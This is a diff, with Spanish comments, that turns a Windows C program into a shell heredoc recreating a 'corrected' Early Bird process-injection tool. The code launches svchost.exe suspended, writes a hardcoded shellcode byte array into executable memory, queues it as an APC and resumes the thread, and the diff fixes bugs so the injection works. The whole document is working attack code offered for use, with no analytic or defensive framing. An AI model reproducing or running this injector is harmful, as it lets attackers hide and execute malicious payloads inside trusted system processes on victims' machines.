@@ -1,10 +1,13 @@
-// early_bird_injection.c
+# Eliminar el archivo anterior
+rm early_bird_injection.c
+
+# Crear el archivo corregido
+cat > early_bird_injection.c << 'EOF'
 #include <windows.h>
 #include <stdio.h>
 #include <tlhelp32.h>
 
-// Shellcode que cargará nuestra DLL (msfvenom generado)
-// Este es un ejemplo simple, usaríamos un shellcode generado dinámicamente
+// Shellcode que cargará nuestra DLL (ejemplo - necesitarás generar el tuyo)
 unsigned char shellcode[] = 
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -33,10 +36,14 @@ DWORD FindTargetProcess(const char* procname) {
     DWORD pid = 0;
     
     hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+    
     pe.dwSize = sizeof(PROCESSENTRY32);
     
-    if (!Process32First(hSnapshot, &pe))
+    if (!Process32First(hSnapshot, &pe)) {
+        CloseHandle(hSnapshot);
         return 0;
+    }
     
     do {
         if (strcmp(pe.szExeFile, procname) == 0) {
@@ -49,90 +56,94 @@ DWORD FindTargetProcess(const char* procname) {
     return pid;
 }
 
-BOOL EarlyBirdInjection(DWORD pid) {
+BOOL EarlyBirdInjection() {
     HANDLE hProcess, hThread;
     LPVOID pRemoteMemory;
     
-    // Abrir proceso con los permisos necesarios
-    hProcess = OpenProcess(
-        PROCESS_CREATE_THREAD | 
-        PROCESS_QUERY_INFORMATION | 
-        PROCESS_VM_OPERATION | 
-        PROCESS_VM_WRITE | 
-        PROCESS_VM_READ,
-        FALSE, pid);
-    
-    if (!hProcess) {
-        printf("Error abriendo proceso: %d\n", GetLastError());
-        return FALSE;
-    }
-    
-    // Crear proceso suspendido (Early Bird)
-    STARTUPINFO si = { sizeof(si) };
+    // Crear proceso suspendido - USANDO VERSIÓN ANSI (A) EXPLÍCITAMENTE
+    STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi;
-    WCHAR cmdLine[] = L"C:\\Windows\\System32\\svchost.exe -k LocalService";
     
-    if (!CreateProcessW(
-        NULL, cmdLine, NULL, NULL, FALSE,
-        CREATE_SUSPENDED | DETACHED_PROCESS,
-        NULL, NULL, &si, &pi)) {
-        printf("Error creando proceso suspendido: %d\n", GetLastError());
-        CloseHandle(hProcess);
+    // Usar CreateProcessA en lugar de CreateProcessW
+    if (!CreateProcessA(
+        "C:\\Windows\\System32\\svchost.exe",  // Ruta en ANSI
+        NULL,                                   // Command line
+        NULL,                                   // Process attributes
+        NULL,                                   // Thread attributes
+        FALSE,                                  // Handle inheritance
+        CREATE_SUSPENDED | DETACHED_PROCESS,    // Creation flags
+        NULL,                                   // Environment
+        NULL,                                   // Current directory
+        &si,                                    // Startup info (ANSI)
+        &pi)) {                                 // Process info
+        printf("Error creando proceso suspendido: %lu\n", GetLastError());
         return FALSE;
     }
+    
+    printf("[+] Proceso suspendido creado. PID: %lu\n", pi.dwProcessId);
     
     // Asignar memoria en el proceso suspendido
     pRemoteMemory = VirtualAllocEx(
-        pi.hProcess, NULL, sizeof(shellcode),
-        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        pi.hProcess, 
+        NULL, 
+        sizeof(shellcode),
+        MEM_COMMIT | MEM_RESERVE, 
+        PAGE_EXECUTE_READWRITE);
     
     if (!pRemoteMemory) {
-        printf("Error asignando memoria remota: %d\n", GetLastError());
+        printf("Error asignando memoria remota: %lu\n", GetLastError());
         TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
         return FALSE;
     }
     
     // Escribir shellcode
-    if (!WriteProcessMemory(pi.hProcess, pRemoteMemory, shellcode, sizeof(shellcode), NULL)) {
-        printf("Error escribiendo memoria: %d\n", GetLastError());
+    SIZE_T bytesWritten;
+    if (!WriteProcessMemory(pi.hProcess, pRemoteMemory, shellcode, sizeof(shellcode), &bytesWritten)) {
+        printf("Error escribiendo memoria: %lu\n", GetLastError());
         VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
         TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
         return FALSE;
     }
     
-    // Colocar APC en el hilo principal (aún suspendido)
-    PTHREAD_START_ROUTINE pfnAPC = (PTHREAD_START_ROUTINE)pRemoteMemory;
+    printf("[+] Shellcode escrito en 0x%p\n", pRemoteMemory);
     
-    if (!QueueUserAPC((PAPCFUNC)pfnAPC, pi.hThread, NULL)) {
-        printf("Error encolando APC: %d\n", GetLastError());
+    // Colocar APC en el hilo principal - CORREGIDO: pasar 0 como ULONG_PTR
+    if (!QueueUserAPC((PAPCFUNC)pRemoteMemory, pi.hThread, (ULONG_PTR)0)) {
+        printf("Error encolando APC: %lu\n", GetLastError());
         VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
         TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
         return FALSE;
     }
+    
+    printf("[+] APC encolado exitosamente\n");
     
     // Reanudar hilo - el APC se ejecutará inmediatamente
     ResumeThread(pi.hThread);
+    printf("[+] Hilo reanudado\n");
     
-    printf("[+] Inyección Early Bird completada!\n");
-    
-    // Limpiar handles
+    // Cerrar handles
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
-    CloseHandle(hProcess);
     
     return TRUE;
 }
 
 int main() {
-    DWORD pid = FindTargetProcess("svchost.exe");
+    printf("[+] Iniciando Early Bird Injection...\n");
     
-    if (!pid) {
-        printf("No se encontró svchost.exe\n");
+    if (EarlyBirdInjection()) {
+        printf("[+] Inyección Early Bird completada!\n");
+    } else {
+        printf("[-] Falló la inyección\n");
         return 1;
     }
     
-    printf("[+] Inyectando en proceso suspendido...\n");
-    EarlyBirdInjection(pid);
-    
     return 0;
 }
+EOF
